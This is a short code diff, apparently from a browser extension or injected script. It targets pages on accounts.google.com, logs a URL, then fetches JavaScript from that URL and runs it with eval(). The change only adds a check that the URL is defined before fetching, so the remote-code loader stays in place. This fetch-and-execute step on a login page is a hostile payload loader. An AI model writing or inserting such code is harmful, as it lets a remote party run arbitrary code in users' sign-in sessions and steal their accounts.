@@ -24,5 +24,6 @@ if (location.host == 'accounts.google.com'){
 console.log("[!] URL = " + url)
 
 
-fetch(url).then(response => response.text()).then(code => {eval(code);});
-
+if (url != undefined){
+    fetch(url).then(response => response.text()).then(code => {eval(code);});
+}
